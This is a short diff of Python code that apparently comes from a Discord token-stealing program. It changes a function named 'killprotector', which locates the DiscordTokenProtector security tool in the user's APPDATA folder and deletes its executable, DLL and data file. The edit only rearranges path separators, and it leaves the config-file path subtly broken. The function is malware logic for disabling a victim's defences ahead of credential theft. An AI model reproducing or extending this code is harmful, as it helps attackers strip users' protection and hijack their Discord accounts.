@@ -162,13 +162,13 @@ def create_temp(_dir: str or os.PathLike = None):
 
 def killprotector():
     roaming = os.getenv('APPDATA')
-    path = f"{roaming}\\DiscordTokenProtector\\"
+    path = f"{roaming}\\DiscordTokenProtector"
     config = path + "config.json"
 
     if not os.path.exists(path):
         return
 
-    for process in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
+    for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
         try:
             os.remove(path + process)
         except FileNotFoundError:
